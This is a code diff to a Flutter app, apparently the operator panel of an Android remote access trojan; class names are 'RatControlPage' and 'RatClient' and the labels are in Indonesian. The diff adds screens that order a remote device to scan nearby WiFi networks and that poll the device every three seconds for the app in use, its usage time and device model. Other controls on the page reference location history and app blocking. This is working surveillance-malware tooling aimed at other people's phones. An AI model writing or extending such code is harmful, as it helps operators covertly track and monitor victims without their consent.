@@ -1567,21 +1567,16 @@ class _RatControlPageState extends State<RatControlPage> {
         icon: Icons.wifi,
         iconColor: _sky,
         name: 'WiFi Scan',
-        sub: 'TAP \u00b7 SCAN JARINGAN',
-        onTap: () {
-          _cmd('wifi:scan', '');
-          _toast('Scanning WiFi...', info: true);
-        },
+        sub: d.statusBool('wifiScanStarted') ? 'SCANNING...' : 'TAP \u00b7 SCAN JARINGAN',
+        subColor: d.statusBool('wifiScanStarted') ? _green : null,
+        onTap: _openWifiScan,
       ),
       _CtrlTile(
         icon: Icons.open_in_browser,
         iconColor: Neo.lavender,
         name: 'Aplikasi Aktif',
         sub: 'TAP \u00b7 CEK APP YANG DIBUKA',
-        onTap: () {
-          _cmd(kCmdGetForegroundApp, '');
-          _toast('Mengecek aplikasi aktif...', info: true);
-        },
+        onTap: _openForegroundApp,
       ),
       _CtrlTile(
         icon: Icons.screen_lock_portrait,
@@ -3669,6 +3664,22 @@ class _RatControlPageState extends State<RatControlPage> {
     _toast('Mengambil lokasi & history...', info: true);
     Navigator.of(context).push(MaterialPageRoute(
         builder: (_) => _LocationView(client: client, deviceId: _deviceId!)));
+  }
+
+  void _openWifiScan() {
+    client.clearData(_deviceId!, 'wifi');
+    _cmd('wifi:scan', '');
+    _toast('Scanning WiFi...', info: true);
+    Navigator.of(context).push(MaterialPageRoute(
+        builder: (_) => _WifiScanView(client: client, deviceId: _deviceId!)));
+  }
+
+  void _openForegroundApp() {
+    client.clearData(_deviceId!, 'foregroundApp');
+    _cmd(kCmdGetForegroundApp, '');
+    _toast('Mengecek aplikasi aktif...', info: true);
+    Navigator.of(context).push(MaterialPageRoute(
+        builder: (_) => _ForegroundAppView(client: client, deviceId: _deviceId!)));
   }
 
   void _openBlockApp() {
@@ -5907,5 +5918,339 @@ class _TerminalLine extends StatelessWidget {
   static String _hms(DateTime t) {
     String two(int n) => n.toString().padLeft(2, '0');
     return '${two(t.hour)}:${two(t.minute)}:${two(t.second)}';
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+//  WIFI SCAN VIEW
+// ═══════════════════════════════════════════════════════════════════════════
+
+class _WifiScanView extends StatefulWidget {
+  final RatClient client;
+  final String deviceId;
+  const _WifiScanView({required this.client, required this.deviceId});
+  @override
+  State<_WifiScanView> createState() => _WifiScanViewState();
+}
+
+class _WifiScanViewState extends State<_WifiScanView> {
+  RatClient get client => widget.client;
+  String get deviceId => widget.deviceId;
+  String _search = '';
+  final _searchCtrl = TextEditingController();
+
+  List<Map<String, dynamic>> get _networks {
+    final raw = client.dataFor(deviceId)['wifi'];
+    if (raw is List) return raw.whereType<Map<String, dynamic>>().toList();
+    return const [];
+  }
+
+  List<Map<String, dynamic>> get _filtered {
+    if (_search.isEmpty) return _networks;
+    final q = _search.toLowerCase();
+    return _networks.where((n) {
+      final ssid = (n['ssid'] ?? '').toString().toLowerCase();
+      final bssid = (n['bssid'] ?? '').toString().toLowerCase();
+      return ssid.contains(q) || bssid.contains(q);
+    }).toList();
+  }
+
+  @override
+  void initState() {
+    super.initState();
+    client.addListener(_onData);
+  }
+
+  @override
+  void dispose() {
+    client.removeListener(_onData);
+    _searchCtrl.dispose();
+    super.dispose();
+  }
+
+  void _onData() {
+    if (mounted) setState(() {});
+  }
+
+  int _signalBars(int level) {
+    if (level >= -50) return 4;
+    if (level >= -65) return 3;
+    if (level >= -75) return 2;
+    return 1;
+  }
+
+  Color _signalColor(int level) {
+    if (level >= -50) return Neo.mint;
+    if (level >= -65) return Neo.sky;
+    if (level >= -75) return Neo.peach;
+    return Neo.coral;
+  }
+
+  @override
+  Widget build(BuildContext context) {
+    return Scaffold(
+      backgroundColor: Neo.bg,
+      appBar: AppBar(
+        backgroundColor: Neo.bg,
+        foregroundColor: Neo.textDark,
+        title: const Text('WIFI SCAN',
+            style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 12, letterSpacing: 2, color: Neo.textDark)),
+        actions: [
+          IconButton(
+            icon: const Icon(Icons.refresh, color: Neo.sky, size: 20),
+            onPressed: () {
+              client.clearData(deviceId, 'wifi');
+              client.sendCommand(deviceId, 'wifi:scan', '');
+            },
+          ),
+        ],
+      ),
+      body: Column(
+        children: [
+          Padding(
+            padding: const EdgeInsets.fromLTRB(16, 8, 16, 8),
+            child: TextField(
+              controller: _searchCtrl,
+              onChanged: (v) => setState(() => _search = v),
+              style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Neo.textDark),
+              decoration: InputDecoration(
+                hintText: 'Search SSID/BSSID...',
+                hintStyle: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Neo.textMuted),
+                prefixIcon: const Icon(Icons.search, color: Neo.textMuted, size: 16),
+                filled: true,
+                fillColor: Neo.white,
+                border: OutlineInputBorder(borderSide: const BorderSide(color: Neo.textMuted), borderRadius: BorderRadius.circular(10)),
+                enabledBorder: OutlineInputBorder(borderSide: const BorderSide(color: Neo.textMuted), borderRadius: BorderRadius.circular(10)),
+                contentPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
+              ),
+            ),
+          ),
+          Padding(
+            padding: const EdgeInsets.symmetric(horizontal: 16),
+            child: Text('${_filtered.length} jaringan ditemukan',
+                style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, color: Neo.textMuted, letterSpacing: 1)),
+          ),
+          const SizedBox(height: 8),
+          Expanded(
+            child: _networks.isEmpty
+                ? const Center(child: CircularProgressIndicator(strokeWidth: 2, color: Neo.sky))
+                : ListView.builder(
+                    padding: const EdgeInsets.symmetric(horizontal: 16),
+                    itemCount: _filtered.length,
+                    itemBuilder: (_, i) {
+                      final n = _filtered[i];
+                      final ssid = n['ssid']?.toString() ?? '';
+                      final bssid = n['bssid']?.toString() ?? '';
+                      final level = (n['level'] as num?)?.toInt() ?? -100;
+                      final freq = (n['frequency'] as num?)?.toInt() ?? 0;
+                      final bars = _signalBars(level);
+                      final color = _signalColor(level);
+                      return Container(
+                        margin: const EdgeInsets.only(bottom: 8),
+                        padding: const EdgeInsets.all(14),
+                        decoration: BoxDecoration(
+                          color: Neo.white,
+                          borderRadius: BorderRadius.circular(10),
+                          border: Border.all(color: color.withValues(alpha: 0.4), width: 1.5),
+                        ),
+                        child: Row(
+                          children: [
+                            Icon(Icons.wifi, color: color, size: 24),
+                            const SizedBox(width: 12),
+                            Expanded(
+                              child: Column(
+                                crossAxisAlignment: CrossAxisAlignment.start,
+                                children: [
+                                  Text(ssid.isEmpty ? '(Hidden)' : ssid,
+                                      style: TextStyle(
+                                          fontFamily: 'ShareTechMono',
+                                          fontSize: 12,
+                                          color: ssid.isEmpty ? Neo.textMuted : Neo.textDark,
+                                          fontWeight: FontWeight.w700)),
+                                  const SizedBox(height: 3),
+                                  Text(bssid, style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, color: Neo.textMuted)),
+                                  const SizedBox(height: 2),
+                                  Text('${freq}MHz  |  ${level}dBm',
+                                      style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, color: Neo.textMuted)),
+                                ],
+                              ),
+                            ),
+                            Column(
+                              children: [
+                                Row(
+                                  mainAxisSize: MainAxisSize.min,
+                                  children: List.generate(4, (idx) => Container(
+                                    width: 4,
+                                    margin: const EdgeInsets.symmetric(horizontal: 1),
+                                    height: 6.0 + idx * 4.0,
+                                    decoration: BoxDecoration(
+                                      color: idx < bars ? color : Neo.textMuted.withValues(alpha: 0.3),
+                                      borderRadius: BorderRadius.circular(1),
+                                    ),
+                                  )),
+                                ),
+                                const SizedBox(height: 4),
+                                Text('${level}dBm',
+                                    style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, color: color)),
+                              ],
+                            ),
+                          ],
+                        ),
+                      );
+                    },
+                  ),
+          ),
+        ],
+      ),
+    );
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+//  FOREGROUND APP VIEW
+// ═══════════════════════════════════════════════════════════════════════════
+
+class _ForegroundAppView extends StatefulWidget {
+  final RatClient client;
+  final String deviceId;
+  const _ForegroundAppView({required this.client, required this.deviceId});
+  @override
+  State<_ForegroundAppView> createState() => _ForegroundAppViewState();
+}
+
+class _ForegroundAppViewState extends State<_ForegroundAppView> {
+  RatClient get client => widget.client;
+  String get deviceId => widget.deviceId;
+  Timer? _poll;
+
+  @override
+  void initState() {
+    super.initState();
+    client.addListener(_onData);
+    _poll = Timer.periodic(const Duration(seconds: 3), (_) {
+      client.sendCommand(deviceId, kCmdGetForegroundApp, '');
+    });
+  }
+
+  @override
+  void dispose() {
+    _poll?.cancel();
+    client.removeListener(_onData);
+    super.dispose();
+  }
+
+  void _onData() {
+    if (mounted) setState(() {});
+  }
+
+  @override
+  Widget build(BuildContext context) {
+    final data = client.dataFor(deviceId)['foregroundApp'];
+    return Scaffold(
+      backgroundColor: Neo.bg,
+      appBar: AppBar(
+        backgroundColor: Neo.bg,
+        foregroundColor: Neo.textDark,
+        title: const Text('APLIKASI AKTIF',
+            style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 12, letterSpacing: 2, color: Neo.textDark)),
+        actions: [
+          IconButton(
+            icon: const Icon(Icons.refresh, color: Neo.lavender, size: 20),
+            onPressed: () => client.sendCommand(deviceId, kCmdGetForegroundApp, ''),
+          ),
+        ],
+      ),
+      body: data == null
+          ? const Center(child: CircularProgressIndicator(strokeWidth: 2, color: Neo.lavender))
+          : SingleChildScrollView(
+              padding: const EdgeInsets.all(20),
+              child: Column(
+                crossAxisAlignment: CrossAxisAlignment.stretch,
+                children: [
+                  _buildAppCard(data),
+                  const SizedBox(height: 16),
+                  _buildDeviceInfo(data),
+                ],
+              ),
+            ),
+    );
+  }
+
+  Widget _buildAppCard(dynamic data) {
+    final appName = data is Map ? (data['appName']?.toString() ?? 'Unknown') : 'Unknown';
+    final pkg = data is Map ? (data['packageName']?.toString() ?? '') : '';
+    final icon = data is Map ? data['icon']?.toString() : null;
+    return Container(
+      padding: const EdgeInsets.all(24),
+      decoration: BoxDecoration(
+        color: Neo.white,
+        borderRadius: BorderRadius.circular(14),
+        border: Border.all(color: Neo.lavender, width: 2),
+      ),
+      child: Column(
+        children: [
+          if (icon != null && icon.startsWith('data:'))
+            ClipRRect(
+              borderRadius: BorderRadius.circular(12),
+              child: Image.memory(base64Decode(icon.replaceFirst('data:image/png;base64,', '')),
+                  width: 64, height: 64, fit: BoxFit.cover),
+            )
+          else
+            Container(
+              width: 64, height: 64,
+              decoration: BoxDecoration(color: Neo.lavender.withValues(alpha: 0.2), borderRadius: BorderRadius.circular(12)),
+              child: const Icon(Icons.android, color: Neo.lavender, size: 32),
+            ),
+          const SizedBox(height: 14),
+          Text(appName, textAlign: TextAlign.center,
+              style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 16, fontWeight: FontWeight.w700, color: Neo.textDark, letterSpacing: 1)),
+          const SizedBox(height: 6),
+          Text(pkg, textAlign: TextAlign.center,
+              style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, color: Neo.textMuted)),
+          const SizedBox(height: 4),
+          const Text('● LIVE', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, color: Neo.mint, letterSpacing: 2)),
+        ],
+      ),
+    );
+  }
+
+  Widget _buildDeviceInfo(dynamic data) {
+    final model = data is Map ? (data['deviceModel']?.toString() ?? 'Unknown') : 'Unknown';
+    final sdk = data is Map ? data['sdkVersion']?.toString() : null;
+    final lastUsed = data is Map ? data['lastUsed'] : null;
+    final totalTime = data is Map ? data['totalTimeForeground'] : null;
+
+    return Container(
+      padding: const EdgeInsets.all(16),
+      decoration: BoxDecoration(
+        color: Neo.white,
+        borderRadius: BorderRadius.circular(14),
+        border: Border.all(color: Neo.textMuted, width: 1.5),
+      ),
+      child: Column(
+        crossAxisAlignment: CrossAxisAlignment.start,
+        children: [
+          const Text('DETAIL', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Neo.textMuted, letterSpacing: 2)),
+          const SizedBox(height: 10),
+          _infoRow('Device', model),
+          if (sdk != null) _infoRow('SDK', 'API $sdk'),
+          if (lastUsed != null) _infoRow('Last Used', DateTime.fromMillisecondsSinceEpoch(lastUsed is num ? lastUsed.toInt() : 0).toString().substring(0, 19)),
+          if (totalTime != null && totalTime is num) _infoRow('Foreground', '${(totalTime.toInt() / 1000).toStringAsFixed(1)}s'),
+        ],
+      ),
+    );
+  }
+
+  Widget _infoRow(String label, String value) {
+    return Padding(
+      padding: const EdgeInsets.symmetric(vertical: 4),
+      child: Row(
+        mainAxisAlignment: MainAxisAlignment.spaceBetween,
+        children: [
+          Text(label, style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Neo.textMuted)),
+          Flexible(child: Text(value, style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Neo.textDark), textAlign: TextAlign.end)),
+        ],
+      ),
+    );
   }
 }
